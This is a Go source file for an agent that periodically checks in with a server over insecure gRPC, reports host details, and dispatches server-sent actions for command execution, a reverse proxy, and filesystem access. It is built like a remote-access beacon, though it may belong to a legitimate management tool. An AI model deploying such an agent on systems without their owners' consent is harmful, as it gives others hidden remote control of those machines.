package core

import (
	"context"
	"google.golang.org/grpc"
	"line/client/log"
	"line/grpcchannel"
	"time"
)

var staticInfo = static()
var ReportInterval int
var startAt = int32(time.Now().Unix())

func Reporter(addr string) {
	log.Infof("报告间隔%d秒\n", ReportInterval)
	i := 0
	for {
		i++
		println(i)
		time.Sleep(time.Duration(ReportInterval) * time.Second)
		conn, err := grpc.Dial(addr, grpc.WithInsecure()) //如果需要授权认证或tls加密，则可以使用DialOptions来设置grpc.Dial
		if err != nil {
			log.Errorf("grpc.Dial: %v\n", err)
			continue
		}
		reportDo(conn)
		conn.Close()
	}
}

func reportDo(conn *grpc.ClientConn) {
	cc := grpcchannel.NewChannelClient(conn) //2.新建一个客户端stub来执行rpc方法

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	stream, err := cc.Report(ctx, &grpcchannel.Ping{
		Mid:      staticInfo.MachineID,
		Kernel:   staticInfo.Kernel,
		OsInfo:   staticInfo.OsInfo,
		Interval: int32(ReportInterval),
		StartAt:  startAt,
	})

	if err != nil {
		log.Errorf("reportDo:c.Report: %v\n", err)
		return
	}

	for {
		pong, err := stream.Recv()
		if err != nil {
			log.Errorf("reportDo:stream.Recv: %v\n", err)
			return
		}

		if pong.Action == "fin" {
			log.Infof("收到fin\n")
			return
		}

		log.Infof("收到被捡起的pong: %v\n", pong)
		go handlePong(*pong, cc)
	}
}

func handlePong(pong grpcchannel.Pong, cc grpcchannel.ChannelClient) {
	switch pong.Action {
	case "cmd":
		handleCMD(&pong, cc)
	case "rpxy":
		handleRPxy(&pong, cc, "")
	case "closeConnections":
		handleCloseConnections(&pong)
	case "filesystem":
		handleFilesystem(&pong, cc)
	default:
		println("不支持的acton\n")
	}
}
